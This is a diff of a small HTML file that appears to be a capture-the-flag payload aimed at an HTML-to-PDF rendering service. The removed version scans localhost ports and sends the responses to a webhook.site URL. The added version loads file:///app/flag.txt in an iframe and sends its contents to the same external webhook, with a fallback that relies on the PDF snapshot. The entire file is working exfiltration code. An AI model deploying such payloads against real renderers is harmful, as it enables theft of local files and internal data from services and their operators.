@@ -1,17 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Port Scan</title></head>
+<head>
+    <title>PDF Exploit</title>
+</head>
 <body>
+    <iframe id="target" src="file:///app/flag.txt" width="600" height="400"></iframe>
     <script>
-        const ports = [3000, 8080, 5000, 80, 443];
-        ports.forEach(port => {
-            fetch(`http://127.0.0.1:${port}/`)
-                .then(res => res.text())
-                .then(data => {
-                    fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?error=TypeError%3A%20Failed%20to%20fetch?port=' + port + '&data=' + encodeURIComponent(data));
-                })
-                .catch(err => {}); // ignore failures
-        });
+        setTimeout(() => {
+            try {
+                // Try to read iframe content and exfiltrate
+                const iframeContent = document.getElementById('target').contentWindow.document.body.innerText;
+                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?data=' + encodeURIComponent(iframeContent));
+            } catch (e) {
+                // Even if JS can't read it directly due to isolation, 
+                // if it renders in the DOM, it will be captured in the final PDF snapshot!
+                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?error=' + encodeURIComponent(e.message));
+            }
+        }, 2000);
     </script>
 </body>
 </html>
